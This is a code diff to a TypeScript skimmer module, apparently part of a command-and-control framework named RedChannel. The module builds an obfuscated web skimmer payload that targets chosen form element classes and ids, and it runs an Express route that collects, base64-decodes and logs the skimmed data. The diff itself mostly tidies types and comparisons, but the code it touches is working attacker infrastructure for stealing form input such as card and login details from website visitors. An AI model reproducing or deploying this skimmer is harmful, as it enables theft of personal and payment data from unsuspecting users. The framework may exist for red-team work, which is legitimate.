@@ -1,11 +1,13 @@
 import { Request, Response } from "express";
+import { Application as ExpressApplication } from "express-serve-static-core";
+
 import * as fs from "fs";
 import { obfuscate, ObfuscationResult } from "javascript-obfuscator";
 import Logger from "../lib/logger";
 import RedChannel from "../lib/redchannel";
 
 import { Constants, emsg } from "../utils/utils";
-import BaseModule, { ExecuteReturn } from "./base";
+import BaseModule, { BaseModuleConfig, ExecuteReturn } from "./base";
 
 const MODULE_DESCRIPTION = "manage the skimmer configuration";
 
@@ -20,14 +22,14 @@ const DEFAULT_CONFIG: SkimmerModuleConfig = {
     obfuscate_payload: true,
 };
 
-export type SkimmerModuleConfig = {
+export interface SkimmerModuleConfig extends BaseModuleConfig {
     payload_route: string;
     data_route: string;
     url: string;
     target_classes: string[];
     target_ids: string[];
     obfuscate_payload: boolean;
-};
+}
 
 export default class SkimmerModule extends BaseModule {
     payload: string;
@@ -38,7 +40,7 @@ export default class SkimmerModule extends BaseModule {
 
         this.description = MODULE_DESCRIPTION;
 
-        this.config = this.resetConfig(DEFAULT_CONFIG);
+        this.config = this.resetConfig(DEFAULT_CONFIG) as SkimmerModuleConfig;
 
         this.defineCommands({
             generate: {
@@ -65,7 +67,7 @@ export default class SkimmerModule extends BaseModule {
                 arguments: ["<1|0>"],
                 description: "enable or disable payload obfuscation",
                 execute: (params: string) => {
-                    this.config.obfuscate_payload = params != "0" && params != "false" ? true : false;
+                    this.config.obfuscate_payload = params !== "0" && params !== "false" ? true : false;
                 },
             },
             "set data_route": {
@@ -99,8 +101,8 @@ export default class SkimmerModule extends BaseModule {
         this.payload = "";
     }
 
-    run(params?: string[]): ExecuteReturn {
-        if (!this.config.url) throw new Error(`skimmer url is required, see 'help'`);
+    run(): ExecuteReturn {
+        if (!this.config.url) throw new Error("skimmer url is required, see 'help'");
 
         let data: Buffer;
         let skimmerJs = "";
@@ -145,7 +147,7 @@ export default class SkimmerModule extends BaseModule {
         return { message: `skimmer payload set to: \n${this.payload}` };
     }
 
-    setupRoutes(webServer: any, logger: Logger): void {
+    setupRoutes(webServer: ExpressApplication, logger: Logger): void {
         webServer.get(this.config.data_route, (request: Request, response: Response) => {
             logger.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
 
@@ -154,6 +156,7 @@ export default class SkimmerModule extends BaseModule {
                 const decodedData = Buffer.from(skimmerId, "base64").toString();
                 logger.success(`incoming skimmer data:\n${decodedData}`);
             } else {
+                logger.warn(`incoming skimmer data did not have an id`);
             }
             response.send();
         });
